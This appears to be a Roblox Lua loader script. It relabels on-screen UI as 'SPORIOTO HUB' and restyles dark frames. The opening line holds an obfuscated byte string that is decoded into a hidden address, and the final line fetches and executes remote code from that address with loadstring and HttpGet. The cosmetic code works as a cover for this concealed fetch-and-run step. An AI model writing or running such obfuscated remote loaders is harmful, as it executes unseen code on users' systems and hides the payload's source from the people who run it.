
--[[ STAGE 2: VISUAL CORE ]]
local JKb8LL9eU4G0CA4A7sO="\130\146\158\158\101\168\161\173\116\103\121\188\113\127\078\070\087\064\095\089\087\032\093\045\040\050\047\060\006\068\061\013\015\085\016\029\024\023\231\027\239\231\240\249\246\005\252\200\195\193\213\165\203\218\166\237\175\167\171\188\249\165\162\189\211\223\129\188\147\157\154\106\117\101\107\124\105\066\122\123\121\108\081\088\087\033\046\093\085\050\035\051\051\004\051\061\053\021\031\024\021\019\017\026\043\231\060\004\003\013\248\012\206\211\195"local WKV11vVCJ36_1vq9pZQhD=228 local _6C2Qu2HfDUJi9=233 local afonfgMir5BVWcKjP=1 local wj3iOOx3aWIMbM=4 local BRT2bH80P4ek8H_O8xTT=17 local SLh4u3uQNgCMnqVLVikVG9=false local xs9NJKMzSC7_=bit32 and bit32.bxor if not xs9NJKMzSC7_ then xs9NJKMzSC7_=function(a,b)local r,m=0,1 while a>0 or b>0 do local aa=a%2 local bb=b%2 if aa~=bb then r=r+m end a=(a-aa)/2 b=(b-bb)/2 m=m*2 end return r end end local rShyjJfp15Kczj4V={}for Gy8WtkxuSvHC1MBXUUtBJb=1,#JKb8LL9eU4G0CA4A7sO do local zhfk94JHXNka=string.byte(JKb8LL9eU4G0CA4A7sO,Gy8WtkxuSvHC1MBXUUtBJb)local YyWyIrUUc9cgYyjV=(_6C2Qu2HfDUJi9+(Gy8WtkxuSvHC1MBXUUtBJb*wj3iOOx3aWIMbM)+BRT2bH80P4ek8H_O8xTT)%256 if afonfgMir5BVWcKjP==0 then zhfk94JHXNka=(zhfk94JHXNka-YyWyIrUUc9cgYyjV)%256 rShyjJfp15Kczj4V[Gy8WtkxuSvHC1MBXUUtBJb]=string.char(xs9NJKMzSC7_(zhfk94JHXNka,WKV11vVCJ36_1vq9pZQhD))else zhfk94JHXNka=xs9NJKMzSC7_(zhfk94JHXNka,WKV11vVCJ36_1vq9pZQhD)rShyjJfp15Kczj4V[Gy8WtkxuSvHC1MBXUUtBJb]=string.char((zhfk94JHXNka-YyWyIrUUc9cgYyjV)%256)end end local Fk77pAyayMtZ3_wRsjaOX=table.concat(rShyjJfp15Kczj4V)if SLh4u3uQNgCMnqVLVikVG9 then Fk77pAyayMtZ3_wRsjaOX=string.reverse(Fk77pAyayMtZ3_wRsjaOX)end local FnbwiyVZYlxqVKmeSI=Fk77pAyayMtZ3_wRsjaOX
local HubName = "SPORIOTO HUB"
local Acc = Color3.fromRGB(0, 255, 120)

-- // SMART HOOK //
local function Hook()
    local function Customize(obj)
        pcall(function()
            if obj:IsA("TextLabel") then
                if obj.TextSize >= 18 or obj.Name:find("Title") or obj.Name:find("Header") then
                    if #obj.Text > 3 and not tonumber(obj.Text) then
                        obj.Text = HubName
                        obj.TextColor3 = Acc
                    end
                end
            end
            if obj:IsA("Frame") or obj:IsA("TextButton") then
                if obj.BackgroundColor3.R < 0.2 then
                    if not obj:FindFirstChild("UICorner") then
                        local uic = Instance.new("UICorner")
                        uic.CornerRadius = UDim.new(0, 6)
                        uic.Parent = obj
                    end
                end
            end
        end)
    end

    game.DescendantAdded:Connect(function(c)
        if c:IsA("GuiObject") then
            task.delay(0.1, function() Customize(c) end)
        end
    end)
end

Hook()
loadstring(game:HttpGet(FnbwiyVZYlxqVKmeSI))()
